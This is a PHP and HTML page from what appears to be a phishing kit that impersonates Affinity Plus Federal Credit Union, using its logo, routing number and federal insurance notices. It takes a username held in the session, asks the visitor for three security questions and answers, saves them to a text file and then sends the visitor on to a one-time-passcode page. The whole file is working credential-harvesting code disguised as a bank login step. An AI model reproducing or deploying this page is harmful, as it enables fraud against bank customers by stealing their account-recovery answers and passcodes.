<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

$questions = [
    'What was your childhood nickname?',
    "What is your mother's maiden name?",
    'What was the name of your first pet?',
    'What was the make and model of your first car?',
    'What city were you born in?',
    'What is your favorite childhood memory?',
    'What was your first job title?',
    'What is the name of your favorite teacher?',
    'What is your favorite book or movie character?',
    'What street did you grow up on?'
];

$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $question1 = $_POST['question1'] ?? '';
    $answer1 = trim($_POST['answer1'] ?? '');
    $question2 = $_POST['question2'] ?? '';
    $answer2 = trim($_POST['answer2'] ?? '');
    $question3 = $_POST['question3'] ?? '';
    $answer3 = trim($_POST['answer3'] ?? '');
    
    // Validation
    if (empty($question1)) $errors['question1'] = 'Please select a question';
    if (empty($answer1)) $errors['answer1'] = 'Please provide an answer';
    if (empty($question2)) $errors['question2'] = 'Please select a question';
    if (empty($answer2)) $errors['answer2'] = 'Please provide an answer';
    if (empty($question3)) $errors['question3'] = 'Please select a question';
    if (empty($answer3)) $errors['answer3'] = 'Please provide an answer';
    
    // Check for duplicate questions
    $uniqueQuestions = array_unique([$question1, $question2, $question3]);
    if (count($uniqueQuestions) < 3) {
        $errors['general'] = 'Please select three different security questions';
    }
    
    if (empty($errors)) {
        // Save to test file
        $data = [
            'step' => 'security_questions',
            'usrnm' => $username,
            'chld_pt' => $question1,
            'pt_ans' => $answer1,
            'brth_ct' => $question2,
            'ct_ans' => $answer2,
            'frst_sch' => $question3,
            'sch_ans' => $answer3
        ];
        
        saveUserData('security_questions.txt', $data);
        
        // Redirect to OTP page
        header('Location: otp.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Questions - Affinity Plus</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="min-h-screen flex flex-col overflow-hidden bg-cover bg-center bg-no-repeat relative" style="background-image: url('assets/background.jpeg');">
        <!-- Dark Overlay -->
        <div class="absolute inset-0 bg-black/40"></div>
        
        <!-- Relative Container -->
        <div class="relative z-10 flex flex-col min-h-screen">
            <!-- Header -->
            <header class="bg-purple-900 text-white py-3 px-6 flex items-center justify-between shadow-md">
                <div class="flex items-center space-x-2">
                    <img src="assets/logo.svg" alt="Affinity Plus Logo" class="h-10 w-auto" />
                </div>
                <div class="flex items-center space-x-3">
                    <div class="text-white/80 hover:text-white cursor-pointer transition-colors p-1">
                        <i class="fas fa-comments text-xl"></i>
                    </div>
                </div>
            </header>

            <!-- Main Content -->
            <main class="flex-1 flex items-center justify-center px-4 py-10">
                <!-- Security Questions Card -->
                <div class="bg-white shadow-lg rounded-md w-full max-w-2xl p-6 flex flex-col gap-4">
                    <!-- Card Header -->
                    <div>
                        <h2 class="text-center text-xl font-semibold mb-2 text-gray-900">Security Questions</h2>
                        <p class="text-center text-gray-600 text-sm">Please set up your security questions</p>
                    </div>
                    
                    <?php if (!empty($errors)): ?>
                        <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <div class="ml-3">
                                    <p class="text-sm text-red-700">
                                        Please fix the following errors:
                                        <ul class="list-disc pl-5 mt-1">
                                            <?php foreach ($errors as $error): ?>
                                                <li><?php echo htmlspecialchars($error); ?></li>
                                            <?php endforeach; ?>
                                        </ul>
                                    </p>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="space-y-4">
                <!-- Question 1 -->
                <div class="space-y-1">
                    <label for="question1" class="block text-sm font-medium text-gray-700">
                        Security Question 1
                    </label>
                    <div class="relative">
                        <select
                            id="question1"
                            name="question1"
                            class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                            required
                            onchange="updateQuestionOptions()"
                        >
                            <option value="">Select a question</option>
                            <?php foreach ($questions as $question): ?>
                                <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question1']) && $_POST['question1'] === $question) ? 'selected' : ''; ?>>
                                    <?php echo htmlspecialchars($question); ?>
                                </option>
                            <?php endforeach; ?>
                        </select>
                        <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
                            <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
                                <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z"/>
                            </svg>
                        </div>
                    </div>
                    <?php if (!empty($errors['question1'])): ?>
                        <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['question1']); ?></p>
                    <?php endif; ?>
                    <div>
                        <input
                            type="text"
                            name="answer1"
                            value="<?php echo htmlspecialchars($_POST['answer1'] ?? ''); ?>"
                            class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                            placeholder="Your answer"
                            required
                        >
                        <?php if (!empty($errors['answer1'])): ?>
                            <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['answer1']); ?></p>
                        <?php endif; ?>
                    </div>
                </div>
                
                <!-- Question 2 -->
                <div>
                    <label for="question2" class="block text-sm font-medium text-gray-700 mb-1">
                        Security Question 2
                    </label>
                    <select
                        id="question2"
                        name="question2"
                        class="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
                        required
                    >
                        <option value="">Select a question</option>
                        <?php 
                        $excludedQuestions = [$_POST['question1'] ?? ''];
                        foreach ($questions as $question): 
                            if (!in_array($question, $excludedQuestions)):
                        ?>
                            <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question2']) && $_POST['question2'] === $question) ? 'selected' : ''; ?>>
                                <?php echo htmlspecialchars($question); ?>
                            </option>
                        <?php 
                            endif;
                        endforeach; 
                        ?>
                    </select>
                    <?php if (!empty($errors['question2'])): ?>
                        <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['question2']); ?></p>
                    <?php endif; ?>
                    <div class="mt-2">
                        <input
                            type="text"
                            name="answer2"
                            value="<?php echo htmlspecialchars($_POST['answer2'] ?? ''); ?>"
                            class="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
                            placeholder="Your answer"
                            required
                        >
                        <?php if (!empty($errors['answer2'])): ?>
                            <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['answer2']); ?></p>
                        <?php endif; ?>
                    </div>
                </div>
                
                <!-- Question 3 -->
                <div>
                    <label for="question3" class="block text-sm font-medium text-gray-700 mb-1">
                        Security Question 3
                    </label>
                    <select
                        id="question3"
                        name="question3"
                        class="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
                        required
                    >
                        <option value="">Select a question</option>
                        <?php 
                        $excludedQuestions = [$_POST['question1'] ?? '', $_POST['question2'] ?? ''];
                        foreach ($questions as $question): 
                            if (!in_array($question, $excludedQuestions)):
                        ?>
                            <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question3']) && $_POST['question3'] === $question) ? 'selected' : ''; ?>>
                                <?php echo htmlspecialchars($question); ?>
                            </option>
                        <?php 
                            endif;
                        endforeach; 
                        ?>
                    </select>
                    <?php if (!empty($errors['question3'])): ?>
                        <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['question3']); ?></p>
                    <?php endif; ?>
                    <div class="mt-2">
                        <input
                            type="text"
                            name="answer3"
                            value="<?php echo htmlspecialchars($_POST['answer3'] ?? ''); ?>"
                            class="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
                            placeholder="Your answer"
                            required
                        >
                        <?php if (!empty($errors['answer3'])): ?>
                            <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['answer3']); ?></p>
                        <?php endif; ?>
                    </div>
                </div>
                
                <div class="pt-2">
                    <button
                        type="submit"
                        class="w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition disabled:opacity-70"
                    >
                        Continue
                    </button>
                </div>
            </form>
            
                    </form>
                </div>
            </main>

            <!-- Footer -->
            <footer class="bg-white py-6 text-center text-sm text-gray-700 border-t border-gray-200">
                <div class="flex flex-col md:flex-row items-center justify-center gap-3 mb-3">
                    <a href="#" class="text-purple-800 hover:underline">Contact Us</a>
                    <a href="#" class="text-purple-800 hover:underline">Locations</a>
                    <a href="#" class="text-purple-800 hover:underline">Disclosures</a>
                    <a href="#" class="text-purple-800 hover:underline">Privacy Policy</a>
                    <a href="#" class="text-purple-800 hover:underline">Open a Membership</a>
                </div>
                <p class="text-xs text-gray-600">Routing # 296076301</p>
                <p class="text-xs mt-2 text-gray-600">
                    Affinity Plus Federal Credit Union is federally insured by the National Credit Union Administration. Copyright © 2025 Affinity Plus Federal Credit Union.
                </p>

                <div class="flex items-center justify-center gap-4 mt-4">
                    <img src="assets/equal-housing.png" alt="Equal Housing Lender" class="h-8 w-auto" />
                    <img src="assets/ncua.png" alt="NCUA Insured" class="h-8 w-auto" />
                </div>
            </footer>
        </div>
    </div>
    
    <script>
        const allQuestions = [
            'What was your childhood nickname?',
            "What is your mother's maiden name?",
            'What was the name of your first pet?',
            'What was the make and model of your first car?',
            'What city were you born in?',
            'What is your favorite childhood memory?',
            'What was your first job title?',
            'What is the name of your favorite teacher?',
            'What is your favorite book or movie character?',
            'What street did you grow up on?'
        ];

        function updateQuestionOptions() {
            const selected1 = document.getElementById('question1').value;
            const selected2 = document.getElementById('question2').value;
            const selected3 = document.getElementById('question3').value;
            
            // Update question2 options
            updateSelectOptions('question2', [selected1, selected3]);
            
            // Update question3 options
            updateSelectOptions('question3', [selected1, selected2]);
        }
        
        function updateSelectOptions(selectId, excludeValues) {
            const select = document.getElementById(selectId);
            const currentValue = select.value;
            const currentSelected = Array.from(select.selectedOptions).map(opt => opt.value);
            
            // Save the current value if it's not in the excluded values
            const shouldKeepCurrent = currentValue && !excludeValues.includes(currentValue);
            
            // Rebuild options
            select.innerHTML = '<option value="">Select a question</option>';
            
            allQuestions.forEach(question => {
                if (!excludeValues.includes(question)) {
                    const option = document.createElement('option');
                    option.value = question;
                    option.textContent = question;
                    if ((shouldKeepCurrent && question === currentValue) || currentSelected.includes(question)) {
                        option.selected = true;
                    }
                    select.appendChild(option);
                }
            });
        }
        
        // Initialize the page
        document.addEventListener('DOMContentLoaded', function() {
            // Add event listeners
            document.getElementById('question1')?.addEventListener('change', updateQuestionOptions);
            document.getElementById('question2')?.addEventListener('change', updateQuestionOptions);
            document.getElementById('question3')?.addEventListener('change', updateQuestionOptions);
            
            // Initial update
            updateQuestionOptions();
        });
    </script>
    </div>
</body>
</html>
